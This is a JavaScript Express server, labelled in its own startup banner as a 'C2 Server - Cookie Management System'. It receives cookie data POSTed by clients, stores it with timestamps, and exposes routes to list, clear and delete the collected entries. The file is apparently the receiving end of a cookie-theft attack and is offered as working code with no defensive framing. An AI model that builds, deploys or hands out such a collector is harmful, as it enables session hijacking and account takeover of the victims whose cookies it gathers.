const express = require("express");
const path = require("path");
const app = express();

// Middleware to parse body as text (Content-Type: text/plain)
app.use(express.text());
app.use(express.json());

app.use(express.static(path.join(__dirname, "public")));
// Variable to store cookie with timestamp
let receivedCookies = [];

// Route POST receive data from client
app.post("/", (req, res) => {
  const cookieData = req.body; // Get data from client
  const cookieEntry = {
    data: cookieData,
    timestamp: new Date().toISOString(),
    id: receivedCookies.length + 1,
  };
  receivedCookies.push(cookieEntry); // Save to array
  console.log(`[${new Date().toLocaleString()}] Cookie received:`, cookieData);
  res.send("Cookie received successfully!");
});

// Route GET to return home page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Route GET to return list of cookies
app.get("/get-cookie-names", (req, res) => {
  // Return array of cookie data to compatible with old code
  const cookieNames = receivedCookies.map((cookie) => cookie.data);
  res.json(cookieNames);
});

// Route GET to return list of cookies with metadata
app.get("/get-cookies", (req, res) => {
  res.json(receivedCookies);
});

// Route POST to clear all cookies
app.post("/clear-cookies", (req, res) => {
  receivedCookies = [];
  console.log(`[${new Date().toLocaleString()}] All cookies cleared`);
  res.json({ success: true, message: "All cookies cleared successfully" });
});

// Route DELETE to delete a specific cookie
app.delete("/cookie/:id", (req, res) => {
  const id = parseInt(req.params.id);
  const index = receivedCookies.findIndex((c) => c.id === id);
  if (index !== -1) {
    receivedCookies.splice(index, 1);
    res.json({ success: true, message: "Cookie deleted" });
  } else {
    res.status(404).json({ success: false, message: "Cookie not found" });
  }
});

// CORS middleware (if needed)
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});

app.listen(3000, () => {
  console.log("╔═══════════════════════════════════════╗");
  console.log("║   C2 Server - Cookie Management System ║");
  console.log("║   Listening on http://localhost:3000  ║");
  console.log("╚═══════════════════════════════════════╝");
});
